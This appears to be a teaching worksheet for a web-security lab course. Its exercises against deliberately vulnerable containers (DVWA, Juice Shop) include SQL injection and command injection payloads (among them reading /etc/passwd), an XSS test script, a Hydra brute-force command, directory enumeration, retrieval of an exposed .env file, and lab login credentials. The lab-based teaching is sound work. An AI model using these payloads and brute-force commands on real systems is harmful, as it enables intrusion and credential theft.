# Week 7 Worksheet — Web Application Security & Protocol Analysis

## Overview

This week covers the OWASP Top 10 web application vulnerabilities — SQL injection,
command injection, XSS, broken authentication, security misconfigurations, and
sensitive data exposure — using DVWA and OWASP Juice Shop, alongside protocol
analysis with Wireshark and legacy service exploitation.

## Lab Environment

| Container | IP | Access |
|-----------|-----|--------|
| week7-attacker | 10.10.7.13 | `docker exec -it week7-attacker bash` |
| week7-dvwa | 10.10.7.12 | http://localhost:8085 (admin/password) |
| week7-juice-shop | 10.10.7.11 | http://localhost:3012 |
| week7-mysql | 10.10.7.9 | mysql -h 10.10.7.9 -u user -puserpassword --skip-ssl |
| week7-telnet | 10.10.7.10 | telnet 10.10.7.10 |
| week7-ldap | 10.10.7.7 | ldapsearch -x -H ldap://10.10.7.7 |
| week7-wireshark | 10.10.7.2 | http://localhost:3000 |

## Setup (5 minutes)

```bash
# Start the lab (from repo root)
make run-week7

# Wait ~20 seconds — a helper container initializes DVWA's database
# automatically on first boot (it has none out of the box)
```

**Log in to DVWA:**
- Go to `http://localhost:8085`
- Username: `admin`, Password: `password`
- Open the **DVWA Security** menu and confirm the security level is set to **Low**
  (it defaults to Low, but exercises below assume it)

## Exercises

### 1. SQL Injection — DVWA

Navigate to: **SQL Injection**

Try these payloads in the User ID field:
```
1' OR '1'='1
1' UNION SELECT user, password FROM users-- -
```

Document what data you can extract.

**Question:** Why did `'1'='1'` bypass the login/filter logic? What does that tell
you about how the application built its SQL query from your input?

_________________________________

### 2. Command Injection — DVWA

Navigate to: **Command Injection**

Test:
```
127.0.0.1
127.0.0.1; whoami
127.0.0.1; cat /etc/passwd
```

### 3. Cross-Site Scripting (XSS) — DVWA

Navigate to: **XSS (Reflected)**

In the input field, enter:
```
<script>alert('XSS Found!');</script>
```

**Did the alert box pop up?**  ✓ Yes  ✓ No

**Question:** This script only ran in your own browser, against your own session.
How could an attacker turn this into something that steals *another* user's
cookies or session data?

_________________________________

### 4. Broken Authentication — Hydra Brute Force

DVWA has a dedicated **Brute Force** module built for exactly this exercise. Unlike
DVWA's login page, it has no CSRF token — but it does require you to already be
logged in, so Hydra needs your session cookie.

**Step 1 — Get your session cookie:**
While logged into DVWA in your browser, open DevTools → Application (or Storage)
→ Cookies → `http://localhost:8085`, and copy the `PHPSESSID` value.

**Step 2 — Build a small password list:**
```bash
echo "letmein" > /tmp/passwords.txt
echo "123456" >> /tmp/passwords.txt
echo "password" >> /tmp/passwords.txt
echo "admin" >> /tmp/passwords.txt
```

**Step 3 — Run Hydra**, replacing `<PHPSESSID>` with the value you copied:
```bash
# -l <user>   : the single username to try
# -P <file>   : password list — try each line as a candidate password
# http-get-form "<path>:<form fields>:<options>:<failure string>"
#   G=1        : skip Hydra's own pre-request — we're supplying our own
#                logged-in session, so we don't want Hydra fetching a
#                fresh (unauthenticated) one that would override it
#   H=Cookie\: ... : send our session + security-level cookies with every
#                attempt (the \: escapes the colon inside the header)
#   F=incorrect : the string DVWA's page shows on a WRONG password —
#                Hydra reports every attempt where this string is absent
#                as a success, so getting this exactly right matters
hydra -l admin -P /tmp/passwords.txt 10.10.7.12 http-get-form \
  "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:G=1:H=Cookie\: PHPSESSID=<PHPSESSID>; security=low:F=incorrect"
```

**Which password did Hydra find?**

_________________________________

**Question:** Password strength aside — what made this attack possible at all?
(Hint: think about what DVWA's Brute Force page does *not* have, compared to
`login.php`.)

_________________________________

### 5. Directory Enumeration — Juice Shop

Juice Shop is a single-page app — nearly every URL "exists" and returns the same
page, which breaks gobuster's normal not-found detection. Exclude that fallback
page's size and it works:

```bash
# dir            : gobuster's directory/file brute-forcing mode
# -u <url>       : target URL
# -w <file>      : wordlist of paths to try (Juice Shop's own dirbuster list
#                  isn't installed here, so we use dirb's — same idea, different set)
# -t 20          : 20 concurrent threads
# --exclude-length <n> : ignore responses of this body size — the SPA's
#                  fallback page, which every truly-missing path also returns
gobuster dir -u http://10.10.7.11:3000 -w /usr/share/wordlists/dirb/common.txt \
  -t 20 --exclude-length 9393
```

**What real directory did you find?**

_________________________________

**Question:** Why is directory enumeration still useful against a modern
single-page app, even though routing happens client-side in the browser?

_________________________________

### 6. Sensitive Data Exposure — Exposed `.env` File

Misconfigured deployments sometimes leave environment files sitting in the web
root, readable by anyone who guesses the filename.

```bash
curl http://10.10.7.12/.env
```

**What secrets did you find?**

_________________________________

**Question:** This file exists at a predictable, well-known filename. What would
you check for on a real engagement once you'd found one exposed file like this?

_________________________________

### 7. MySQL Enumeration

From the attacker container:
```bash
# Connect to MySQL with known credentials
# -h <host>   : server to connect to
# -u <user>   : username to authenticate as
# -p<pass>    : password, concatenated directly after -p with NO space
#               (a space would make mysql prompt for the password instead)
# --skip-ssl : required — the attacker container's mysql client (MariaDB client)
#              rejects the MySQL server's self-signed TLS certificate by default
mysql -h 10.10.7.9 -u user -puserpassword --skip-ssl exampledb
```
```sql
SHOW TABLES;
DESCRIBE employees;
SELECT * FROM employees;
```

### 8. Telnet Analysis

Open the Wireshark box's own desktop at `http://localhost:3000` (noVNC) and
do **everything below from a terminal inside that desktop** — not from the
attacker container. The lab network is a Docker bridge, which behaves like a
switch: it only delivers traffic to/from a container's own interface, so a
`telnet` run from anywhere else never reaches the Wireshark box's capture at
all (same behaviour you already saw in Week 1/Week 3).

Start a packet capture in Wireshark first, then log in via Telnet with the
credentials below — this lets you see your own login travel across the
network in plain text, since Telnet has no encryption at all.

Credentials: `student` / `capture123`

```bash
telnet 10.10.7.10
# Login: student / capture123
```

Find your login in the Wireshark capture (filter on `telnet`, then
right-click a packet → Follow → TCP Stream). Confirm you can read both the
username and password exactly as you typed them.

### 9. LDAP Enumeration

```bash
# Bind as admin and list all objects under the base DN
# -x       : simple authentication (username/password or anonymous) instead of SASL
# -H <uri> : LDAP server URI (host and protocol) to connect to
# -b <dn>  : search base — the point in the directory tree to start searching from
# -D <dn>  : bind DN — the identity to authenticate as
# -w <pw>  : bind password, given directly on the command line (use -W to be
#            prompted interactively instead, so the password isn't left in shell history)
ldapsearch -x -H ldap://10.10.7.7 -b "dc=example,dc=org" -D "cn=admin,dc=example,dc=org" -w admin
```

---

## Optional: CTF Challenge

Once you have completed all exercises above, test your skills with an optional Capture The Flag challenge.

See **[ctf-challenge.md](./ctf-challenge.md)** for objectives.

Two flags to capture: `user.txt` and `root.txt`  
Flag format: `flag{...}`  
No hints — instructor walkthrough released at end of session.
